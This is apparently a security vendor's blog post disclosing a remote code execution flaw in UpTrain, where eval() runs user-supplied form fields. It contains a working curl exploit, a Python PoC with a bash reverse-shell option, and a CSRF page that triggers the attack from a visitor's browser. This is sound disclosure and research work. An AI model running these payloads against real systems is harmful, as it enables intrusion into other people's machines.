---
schema_version: "1.0.0"
document_id: "7ae8cdae737c860b09bb3a87c836fec289a502d6e0fe205f2810151de58c3b63"
company_key: "yc-zeropath"
company: "ZeroPath"
source_id: "yc-zeropath-news-import-51f20a74ff70"
canonical_url: "https://zeropath.com/blog/uptrain-rce-vulnerability-analysis"
published_at: "2024-08-24T00:00:00+00:00"
first_seen_at: "2026-07-22T21:04:51.166008+00:00"
fetched_at: "2026-07-28T22:01:06.812214+00:00"
content_hash: "sha256:2ffce8a4a109ac8f37fe0daa0bafd2c5004f43e0108f79f8a203a827f17dc948"
---

# Critical RCE Vulnerability in UpTrain

# Critical RCE Vulnerability in UpTrain


*By Nathan Hrncirik, Co-Founder and Security Researcher at ZeroPath*


ZeroPath security researchers discovered a critical Remote Code Execution (RCE) vulnerability in[UpTrain](https://github.com/uptrain-ai/uptrain) , a popular open-source platform for evaluating, experimenting, monitoring, and testing of LLM applications. This vulnerability, when chained with a Cross-Site Request Forgery (CSRF) attack, allows malicious actors to execute arbitrary code on UpTrain instances, even when running locally.


*Proof of concept demo*


## Vulnerability Discovery + Details


ZeroPath's vulnerability scanner initially flagged a concerning pattern in the UpTrain codebase as a valid vulnerability. Specifically, it highlighted the use of Python's` eval()` function in conjunction with user-supplied input.


Further investigation revealed that the vulnerability was present in several routes within the` uptrain/dashboard/backend/app.py` file. The` /create_project` ,` /new_run` , and` /add_prompts` routes were identified as vulnerable. Here's the vulnerable code snippet for the` /create_project` route:


```text
@router_public  .  post  (  "/create_project"  )
async     def     create_project  (
model  :     str     =   Form  (  .  .  .  )  ,
project_name  :     str     =   Form  (  .  .  .  )  ,
dataset_name  :     str     =   Form  (  .  .  .  )  ,
checks  :     list     =   Form  (  .  .  .  )  ,
data_file  :   UploadFile   =   File  (  .  .  .  )  ,
metadata  :     str     =   Form  (  .  .  .  )  ,
user_id  :     str     =   Depends  (  validate_api_key_public  )  ,
db  :   Session   =   Depends  (  get_db  )  ,
fsspec_fs  :   t  .  Any   =   Depends  (  get_fsspec_fs  )  ,
)  :
# ...


checks   =     eval  (  checks  [  0  ]  )
checks_1   =     [  ]
metadata   =     eval  (  metadata  )


for   check   in   checks  :
if   check   in   metadata  :
final_check   =   checks_mapping  (  check  ,   metadata  [  check  ]  )
else  :
final_check   =   checks_mapping  (  check  )


if   final_check   is     not     None  :
checks_1  .  append  (  final_check  )


# ...
```


The core issue lies in the direct use of` eval()` on user-supplied form data, specifically` checks` and` metadata` . This allows an attacker to craft a payload that, when evaluated, executes malicious code on the server.


To demonstrate the vulnerability, we created a payload and proof of concept script for the` /create_project` endpoint. For this example, we'll use a payload that creates a file named` zeropath` in the` /tmp` directory:


```text
payload   =     "__import__('os').system('touch /tmp/zeropath')"
```


Here's a quick cURL command that demonstrates the exploit:


```text
curl     'http://localhost:4300/api/public/create_project'     \
-H   'Accept: */*'     \
-H   'Accept-Language: en-US,en'     \
-H   'Connection: keep-alive'     \
-H   'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysFz2W1h9iMH4IFs9'     \
-H   'Origin: http://localhost:3000'     \
-H   'Referer: http://localhost:3000/'     \
-H   'uptrain-access-token: default_key'     \
--data-raw   $'------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="model"  \r  \n  \r  \n  gpt-3.5-turbo  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="project_name"  \r  \n  \r  \n  asdf  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="checks"  \r  \n  \r  \n  __import__(\'os\').system(\'touch /tmp/zeropath\')  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="dataset_name"  \r  \n  \r  \n  asdf  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="data_file"; filename="test.jsonl"  \r  \n  Content-Type: application/octet-stream  \r  \n  \r  \n  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9  \r  \n  Content-Disposition: form-data; name="metadata"  \r  \n  \r  \n  {"gpt-3.5-turbo":{"openai_api_key":"asdf"}}  \r  \n  ------WebKitFormBoundarysFz2W1h9iMH4IFs9--  \r  \n  '
```


## Proof of Concept


Here's a full Python PoC script that demonstrates the vulnerability:


```text
#!/usr/bin/env python3


import   argparse
import   requests


def     execute_command  (  url  ,   command  ,   access_token  )  :
headers   =     {
'Accept'  :     '*/*'  ,
'Accept-Language'  :     'en-US,en'  ,
'Connection'  :     'keep-alive'  ,
'Origin'  :     'http://localhost:3000'  ,
'Referer'  :     'http://localhost:3000/'  ,
'uptrain-access-token'  :   access_token
}


data   =     {
'model'  :     'gpt-3.5-turbo'  ,
'project_name'  :     'zeropath'  ,
'checks'  :     f'__import__(\'os\').system(\'  {  command  }  \')'  ,
'dataset_name'  :     'zeropath'  ,
'metadata'  :     '{"gpt-3.5-turbo":{"openai_api_key":"dummy_key"}}'
}
print  (  f"[*] Generated payload:   {  data  [  'checks'  ]  }  "  )
files   =     {
'data_file'  :     (  'test.jsonl'  ,     ''  ,     'application/octet-stream'  )
}


response   =   requests  .  post  (  url   +     "/api/public/create_project"  ,   headers  =  headers  ,   data  =  data  ,   files  =  files  )
return   response  .  status_code  ,   response  .  text


def     main  (  )  :
parser   =   argparse  .  ArgumentParser  (  description  =  'UpTrain Exploit PoC'  )
parser  .  add_argument  (  '--url'  ,   required  =  True  ,     help  =  'UpTrain URL'  )
parser  .  add_argument  (  '--cmd'  ,     help  =  'Command to execute'  )
parser  .  add_argument  (  '--shell'  ,   nargs  =  2  ,   metavar  =  (  'IP'  ,     'PORT'  )  ,     help  =  'Reverse shell IP and port'  )
parser  .  add_argument  (  '--token'  ,   default  =  'default_key'  ,     help  =  'UpTrain access token (default: default_key)'  )


args   =   parser  .  parse_args  (  )


if     not   args  .  cmd   and     not   args  .  shell  :
parser  .  error  (  "Either --cmd or --shell must be provided"  )


if   args  .  shell  :
command   =     f"bash -c \"bash -i >& /dev/tcp/  {  args  .  shell  [  0  ]  }  /  {  args  .  shell  [  1  ]  }   0>&1\" &"
else  :
command   =   args  .  cmd


print  (  "[!] UpTrain Exploit PoC"  )
print  (  f"[*] Target URL:   {  args  .  url  }  "  )
print  (  f"[*] Executing command:   {  command  }  "  )
print  (  f"[*] Using access token:   {  args  .  token  }  "  )


status_code  ,   response_text   =   execute_command  (  args  .  url  ,   command  ,   args  .  token  )


if   status_code   ==     500  :
print  (  "[+] Command executed successfully!"  )
else  :
print  (  "[-] Command execution failed."  )


if   __name__   ==     "__main__"  :
main  (  )
```


## Bonus: CSRF + RCE Chain


Chaining this RCE with a Cross-Site Request Forgery (CSRF) attack could allow an attacker to compromise a local instance of this app. This is not a traditional CSRF scenario, as it leverages the default API key ("default_key") which is accepted by the vulnerable endpoints.


If an attacker can trick a user who is running UpTrain locally to visit their webpage, the attacker can use the victim's browser to send a malicious POST request to the local UpTrain instance, triggering the RCE.


Here's a proof-of-concept HTML page that demonstrates this attack:


```text
<!  DOCTYPE     html  >
<  html     lang  =  "  en  "  >
<  head  >
<  meta     charset  =  "  UTF-8  "  >
<  meta     name  =  "  viewport  "     content  =  "  width=device-width, initial-scale=1.0  "  >
<  title  >  ZeroPath UpTrain CSRF + RCE POC  </  title  >
</  head  >
<  body  >
<  script  >
document  .  addEventListener  (  'DOMContentLoaded'  ,     function  (  )     {
const   xhr   =     new     XMLHttpRequest  (  )  ;
const   url   =     'http://127.0.0.1:4300/api/public/create_project'  ;
const   boundary   =     '----aaaa'  ;


xhr  .  open  (  'POST'  ,   url  ,     true  )  ;


xhr  .  setRequestHeader  (  'Accept'  ,     '*/*'  )  ;
xhr  .  setRequestHeader  (  'Accept-Language'  ,     'en-US,en'  )  ;
xhr  .  setRequestHeader  (  'Connection'  ,     'keep-alive'  )  ;
xhr  .  setRequestHeader  (  'Content-Type'  ,     'multipart/form-data; boundary='     +   boundary  )  ;
xhr  .  setRequestHeader  (  'Origin'  ,     'http://127.0.0.1:3000'  )  ;
xhr  .  setRequestHeader  (  'Referer'  ,     'http://127.0.0.1:3000/'  )  ;
xhr  .  setRequestHeader  (  'User-Agent'  ,     'ZeroPath-Agent'  )  ;
xhr  .  setRequestHeader  (  'uptrain-access-token'  ,     'default_key'  )  ;


const   formData   =     [
'--'     +   boundary  ,
'Content-Disposition: form-data; name="model"'  ,
''  ,
'gpt-3.5-turbo'  ,
'--'     +   boundary  ,
'Content-Disposition: form-data; name="project_name"'  ,
''  ,
'asdf'  ,
'--'     +   boundary  ,
'Content-Disposition: form-data; name="checks"'  ,
''  ,
'__import__(\'os\').system(\'touch /tmp/zeropath\')'  ,
'--'     +   boundary  ,
'Content-Disposition: form-data; name="dataset_name"'  ,
''  ,
'asdf'  ,
'--'     +   boundary  ,
'Content-Disposition: form-data; name="data_file"; filename="test.jsonl"'  ,
'Content-Type: application/octet-stream'  ,
''  ,
''  ,
'--'     +   boundary  ,
'Content-Disposition: form-data; name="metadata"'  ,
''  ,
JSON  .  stringify  (  {  "gpt-3.5-turbo"  :  {  "openai_api_key"  :  "asdf"  }  }  )  ,
'--'     +   boundary   +     '--'
]  .  join  (  '\r\n'  )  ;


xhr  .  onreadystatechange     =     function  (  )     {
if     (  xhr  .  readyState     ===     XMLHttpRequest  .  DONE  )     {
if     (  xhr  .  status     ===     200  )     {
console  .  log  (  'Request successful'  )  ;
console  .  log  (  xhr  .  responseText  )  ;
}     else     {
console  .  error  (  'Request failed'  )  ;
console  .  error  (  xhr  .  status  ,   xhr  .  statusText  )  ;
}
}
}  ;


xhr  .  send  (  formData  )  ;
}  )  ;
</  script  >
</  body  >
</  html  >
```


## Want to chat?


This RCE vulnerability gives a partial demonstration of ZeroPath's scanning capabilities. While many vulnerability scanners might have flagged this issue, ZeroPath's ability to automatically investigate results across large numbers of repositories was a big help with initial identification.


If you're interested in how you can use ZeroPath to improve your code security, please set up a[call](https://cal.com/team/zeropath/chat) with our team!


## Legal Disclaimer


The Proof of Concept (PoC) provided serves solely for educational and research objectives. Its purpose is to showcase a specific vulnerability and aid in comprehending associated security risks.


The creators and contributors of this blog disclaim all liability for the improper use or any damage or harm resulting from the use of this PoC. By utilizing this PoC, you consent to use it in a responsible manner and at your own risk.
